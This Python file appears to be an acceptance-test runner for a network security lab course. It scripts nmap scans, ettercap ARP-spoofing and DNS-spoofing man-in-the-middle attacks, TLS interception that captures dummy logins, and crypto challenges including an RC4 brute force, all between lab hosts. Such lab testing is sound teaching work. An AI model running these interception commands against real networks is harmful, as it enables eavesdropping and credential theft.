"""Dispatch every manifest acceptance case; unknown cases fail explicitly."""
import re
import shlex
from .verification import Failed
from .cases_crypto import run_crypto,py,KEY,IV
from .cases_network import run_network,reset
from .cases_ipsec import run_ipsec,capture_start,capture_stop,listener,flush


def stop_mitm(r,node):
    r.run(node,'if test -f ettercap.pid && kill -0 "$(cat ettercap.pid)" 2>/dev/null; then kill -TERM "$(cat ettercap.pid)"; sleep 2; fi')


def start_mitm(r,node,options):
    r.run(node,f'nohup labinf-ettercap -T -q {options} > {r.work}/ettercap.log 2>&1 </dev/null & echo $! > ettercap.pid\nsleep 3\nkill -0 "$(cat ettercap.pid)"')


def lab01(r,name):
    a,b=r.ip('alice'),r.ip('bob')
    if name=='services':
        r.run('alice','netstat -ltupn\npython3 /usr/local/bin/not_ftp.py --healthcheck')
        r.run('bob',f'for port in 21 22 25 80; do nc -z -w 3 {a} "$port"; done\ncurl --fail --max-time 5 http://{a}/login.html')
    elif name=='scans':
        for opts in ('-sT -p 80 -O','-sT -Pn -p 1-1024','-sV -Pn -p 1-1024','-A -Pn -p 1-1024'):
            r.run('bob',f'nmap {opts} -n -v {a} > scan\ncat scan\ngrep "80/tcp.*open" scan',timeout=180)
        r.run('bob',f'nmap -T0 --scan-delay 20ms -sV --version-light -Pn -n -p 80 {a} > scan-T0-bounded\ncat scan-T0-bounded\ngrep "80/tcp.*open" scan-T0-bounded',timeout=90)
        r.run('bob',py(f'''
            import socket
            with socket.create_connection(('{a}',21),5) as s:
                s.settimeout(5);assert b'username' in s.recv(256)
                s.sendall(b'bob\\r\\n');assert b'password' in s.recv(256)
                s.sendall(b'practice\\r\\n');assert b'stole' in s.recv(512)
        '''))
        r.run('bob',f"printf '\\n' | timeout 8 nc {a} 21",expect=[0,124])
    elif name=='challenge':
        r.run('bob',py(f'''
            import urllib.request
            base='http://{a}'
            index=urllib.request.urlopen(base+'/').read().decode();assert 'secret.html' in index
            secret=urllib.request.urlopen(base+'/secret.html').read().decode();assert 'SSI{{' in secret
            print(secret)
        '''))
    elif name=='mitm':
        c=r.ip('chuck');capture_start(r,'chuck','mitm','tcp port 80 or tcp port 25 or tcp port 22 or arp')
        start_mitm(r,'chuck',f'-M arp /{a}// /{b}//')
        mac=r.run('chuck','cat /sys/class/net/eth0/address').strip()
        r.run('bob',f'ping -c 2 -W 2 {a}\nip neigh show {a} | grep {mac}\ncurl --max-time 8 -sS -d "username=labuser&password=labpass" http://{a}/login.html\nprintf "LABINF credit card 7865-8993-6282-8282\\n" | s-nail -S mta=smtp://{a} -S from=bob@kali -s LABINF alice@kali\nsshpass -p alice ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null alice@{a} id -un',timeout=50)
        r.run('alice',"for n in {1..30}; do if grep '7865-8993-6282-8282' /var/mail/alice; then exit 0; fi; sleep .2; done\nexit 1")
        capture_stop(r,'chuck','mitm','HTTP|SMTP|SSH|ARP')
        r.run('chuck',"tcpdump -A -r mitm.pcap > decoded\ngrep 'username=labuser' decoded\ngrep '7865-8993-6282-8282' decoded\ngrep -E 'labuser|labpass' ettercap.log")
        stop_mitm(r,'chuck')
    elif name=='browser':
        r.run('chuck',"labinf-gui start\ncp /etc/ettercap/etter.conf /workspace/etter-original.conf\nsed -i -E 's/^ec_uid =.*/ec_uid = 0/; s/^ec_gid =.*/ec_gid = 0/; s|^remote_browser =.*|remote_browser = \"/usr/local/bin/labinf-browser http://%host%url\"|' /etc/ettercap/etter.conf\nrm -f /tmp/labinf-browser-requests")
        start_mitm(r,'chuck',f'-M arp /{a}//80 /{b}// -P remote_browser')
        r.run('bob',f'curl --max-time 8 http://{a}/index.html?browser-proof=labinf')
        r.run('chuck',"for n in {1..120}; do if test -f /tmp/labinf-browser-requests && grep browser-proof /tmp/labinf-browser-requests && pgrep -u kali -f 'firefox'; then break; fi; sleep .25; done\ncat ettercap.log\ntest -f /tmp/labinf-browser-requests && grep -q browser-proof /tmp/labinf-browser-requests && pgrep -u kali -f 'firefox'",timeout=40)
        # Firefox ESR's X11 WM_CLASS differs across distro builds. Match the
        # actual visible window title and record its ID instead of guessing a
        # class name or treating a running process as proof of a GUI action.
        r.run('chuck',"for n in {1..160}; do wid=$(runuser -u kali -- env DISPLAY=:1 XAUTHORITY=/home/kali/.Xauthority xdotool search --onlyvisible --name 'Mozilla Firefox' 2>/dev/null | head -1 || true); if test -n \"$wid\"; then title=$(runuser -u kali -- env DISPLAY=:1 XAUTHORITY=/home/kali/.Xauthority xdotool getwindowname \"$wid\"); echo \"visible Firefox window $wid: $title\"; [[ \"$title\" == *'Mozilla Firefox'* ]]; exit; fi; sleep .25; done\nrunuser -u kali -- env DISPLAY=:1 XAUTHORITY=/home/kali/.Xauthority xdotool search --onlyvisible --name . | while read -r id; do runuser -u kali -- env DISPLAY=:1 XAUTHORITY=/home/kali/.Xauthority xdotool getwindowname \"$id\"; done\nexit 1",timeout=50)
        stop_mitm(r,'chuck')
        r.run('chuck','cp /workspace/etter-original.conf /etc/ettercap/etter.conf')
    elif name=='spoof':
        legitimate=r.ip('web');forged=a
        r.run('web',"printf legitimate-lab-page > /var/www/html/index.html")
        r.run('alice',"printf forged-lab-page > /var/www/html/index.html")
        r.run('bob',f'curl --fail --max-time 5 http://www.example.test/ | grep legitimate-lab-page')
        # host -v without -t asks several RR types; dnsmasq correctly REFUSED
        # those extra types, making host return 1 despite a valid A answer.
        r.run('bob',f'host -t A -v www.example.test > normal-dns\ncat normal-dns\ngrep {legitimate} normal-dns')
        r.run('alice',f"cp /etc/ettercap/etter.dns /workspace/etter-original.dns\nprintf '\\nwww.example.test A {forged}\\n' >> /etc/ettercap/etter.dns")
        r.run('dns','tc qdisc add dev eth0 root netem delay 200ms')
        capture_start(r,'alice','dns-spoof','udp port 53 or arp')
        start_mitm(r,'alice',f'-M arp:remote /{b}// /{r.ip("gateway")}// -P dns_spoof')
        r.run('bob',f'host -t A -v www.example.test > forged-dns\ncat forged-dns\ngrep {forged} forged-dns')
        r.run('bob','curl --fail --max-time 5 http://www.example.test/ | grep forged-lab-page')
        capture_stop(r,'alice','dns-spoof','domain|ARP')
        stop_mitm(r,'alice')
        r.run('alice','cp /workspace/etter-original.dns /etc/ettercap/etter.dns')
        r.run('dns','tc qdisc del dev eth0 root')
    else:return False
    return True


def mac_app(r):
    r.run('alice',py('''
        import urllib.request,urllib.parse,http.cookiejar,re,json,subprocess
        from pathlib import Path
        from Crypto.Cipher import AES,PKCS1_OAEP,ARC4
        from Crypto.PublicKey import RSA
        from Crypto.Util.Padding import pad,unpad
        base='http://lab02-app:5000'
        jar=http.cookiejar.CookieJar();opener=urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
        def get(path):return opener.open(base+path,timeout=15).read()
        def post(path,data):return opener.open(base+path,urllib.parse.urlencode(data).encode(),timeout=15).read().decode()
        def upload(path,fields,files):
            boundary='LABINFBoundary123';parts=[]
            for name,value in fields.items():parts.append(f'--{boundary}\\r\\nContent-Disposition: form-data; name="{name}"\\r\\n\\r\\n{value}\\r\\n'.encode())
            for name,(filename,data) in files.items():parts.append(f'--{boundary}\\r\\nContent-Disposition: form-data; name="{name}"; filename="{filename}"\\r\\nContent-Type: application/octet-stream\\r\\n\\r\\n'.encode()+data+b'\\r\\n')
            parts.append(f'--{boundary}--\\r\\n'.encode());request=urllib.request.Request(base+path,b''.join(parts),headers={'Content-Type':f'multipart/form-data; boundary={boundary}'})
            return opener.open(request,timeout=15).read().decode()
        for route in ('/','/hash','/challenge','/bruteforce'):assert get(route)
        key=bytes.fromhex('00112233445566778899aabbccddeeff');iv=bytes(16);plain=b'LABINF-OpenSSL-interop'
        Path('web-plain').write_bytes(plain)
        for alg,keyhex,ivhex in [('aes-128-cbc',key.hex(),iv.hex()),('des-cbc','0123456789abcdef','1234567890abcdef'),('des-ede3-cbc','0123456789abcdef23456789abcdef01456789abcdef0123','1234567890abcdef'),('rc4',key.hex(),'')]:
            args=['openssl','enc','-'+alg,'-K',keyhex,'-in','web-plain','-out','web-cipher']
            if ivhex:args+=['-iv',ivhex]
            subprocess.run(args,check=True)
            html=upload('/',{'algorithm':alg,'key':keyhex,'iv':ivhex},{'ciphertext':('cipher',Path('web-cipher').read_bytes())})
            assert plain.decode() in html,(alg,html)
        import hashlib
        assert hashlib.sha256(b'labinf').hexdigest()[0] in post('/hash',{'text':'labinf'})
        ciphertext=get('/bruteforce?file=ctext_alice');candidates=[]
        for n in range(16):
            data=ARC4.new(bytes([n<<4])+bytes(15)).decrypt(ciphertext)
            if all(32<=x<127 for x in data):candidates.append(data)
        assert candidates,candidates
        assert len(get('/bruteforce?file=bruteforce_enc'))==64
        keypair=RSA.generate(2048)
        html=upload('/challenge',{}, {'pubkey':('rsa.pub',keypair.public_key().export_key())})
        encrypted=get('/challenge?download=key');password=get('/challenge?download=pwd')
        aeskey=PKCS1_OAEP.new(keypair).decrypt(encrypted)
        match=re.search(r'IV.*?<span[^>]*>\s*([0-9a-f]{32})',html,re.S)
        assert match, 'No displayed challenge IV'
        iv=bytes.fromhex(match.group(1))
        recovered=unpad(AES.new(aeskey,AES.MODE_CBC,iv).decrypt(password),16).decode()
        Path('web-private.pem').write_bytes(keypair.export_key())
        Path('web-wrapped-key').write_bytes(encrypted)
        Path('web-encrypted-password').write_bytes(password)
        subprocess.run(['openssl','pkeyutl','-decrypt','-inkey','web-private.pem','-in','web-wrapped-key','-out','web-aes-key','-pkeyopt','rsa_padding_mode:oaep'],check=True)
        assert Path('web-aes-key').read_bytes()==aeskey
        subprocess.run(['openssl','enc','-d','-aes-256-cbc','-K',aeskey.hex(),'-iv',iv.hex(),'-in','web-encrypted-password','-out','web-password'],check=True)
        assert Path('web-password').read_text()==recovered
        assert recovered
        solved=post('/challenge',{'user_password':recovered})
        assert 'cataas.com' in solved
        print('Four original app routes and OpenSSL/PyCryptodome interoperation passed.')
    '''),timeout=90)


def tls_mitm(r):
    a,b=r.ip('alice'),r.ip('bob');c=r.ip('chuck')
    cfg=r.material('etter.conf','etter.conf')
    r.run('alice',f'cp /opt/labinf/materials/practice/apache2-ssl /etc/apache2/sites-available/default-ssl.conf\ncp {r.exchange}/tls/server.crt /etc/ssl/certs/labinf-server.crt\ncp {r.exchange}/tls/server.key /etc/ssl/private/labinf-server.key\ncp {r.exchange}/tls/ca.crt /etc/ssl/certs/labinf-ca.crt\na2enmod ssl\na2ensite default-ssl\nlabinf-service restart apache2')
    r.run('bob',f'curl --fail --max-time 10 --tls-max 1.2 --ciphers AES128-SHA --cacert {r.exchange}/tls/ca.crt https://{a}/')
    r.run('chuck',f'cp /etc/ettercap/etter.conf /workspace/etter-original.conf\ncp {shlex.quote(cfg)} /etc/ettercap/etter.conf')
    start_mitm(r,'chuck',f'-M arp /{a}// /{b}// -w {r.work}/tls-intercept.pcap')
    r.run('bob',f'curl --max-time 12 --tls-max 1.2 --ciphers AES128-SHA --cacert {r.exchange}/tls/ca.crt https://{a}/',expect=60)
    r.run('bob',f'curl --max-time 12 --tls-max 1.2 --ciphers AES128-SHA -k -d "username=tlslab&password=tlssecret" https://{a}/')
    r.run('chuck',"grep -E 'tlslab|tlssecret' ettercap.log")
    stop_mitm(r,'chuck')
    r.collect('chuck',r.work+'/tls-intercept.pcap','tls-intercept.pcap')
    r.run('chuck','cp /workspace/etter-original.conf /etc/ettercap/etter.conf')


def execute(r,name):
    if r.e.lab=='01':
        if lab01(r,name):return
    elif name=='mac_app':mac_app(r);return
    elif r.e.lab in ('02','03'):
        if run_crypto(r,name):return
    elif r.e.lab=='04':
        try:
            if run_network(r,name):return
        finally:cleanup_network(r)
    elif r.e.lab=='05':
        if name=='tls_mitm':tls_mitm(r);return
        if run_ipsec(r,name):return
    raise Failed(f'No implementation for {r.e.lab}/{name}')


def cleanup_network(r):
    for node in ('alice','bob','frank'):
        r.run(node,"for file in /workspace/ptunnel.pid /workspace/socks.pid; do if test -f \"$file\" && kill -0 \"$(cat \"$file\")\" 2>/dev/null; then kill \"$(cat \"$file\")\"; fi; done\nfor process in hts htc ptunnel; do if pgrep -x \"$process\" >/dev/null; then pkill -x \"$process\"; fi; done\nrm -f /etc/ssh/sshd_config.d/00-labinf-gateway.conf\nif labinf-service status apache2 | grep -q RUNNING; then labinf-service restart apache2; else labinf-service start apache2; fi\nlabinf-service restart ssh",timeout=40)
    reset(r)


def cleanup(r):
    if r.e.lab=='04':cleanup_network(r)
    elif r.e.lab=='05':
        nodes=('gwa','gwb') if r.e.scenario=='site' else ('alice','bob','chuck')
        for node in nodes:
            r.run(node,'if test -f tls.pid && kill -0 "$(cat tls.pid)" 2>/dev/null; then kill "$(cat tls.pid)"; fi\nif ipsec statusall >/dev/null 2>&1; then ipsec stop; fi\nip xfrm policy flush\nip xfrm state flush')
            if node=='chuck':stop_mitm(r,node)
    elif r.e.lab=='01':
        stop_mitm(r,'chuck' if r.e.scenario=='lan' else 'alice')
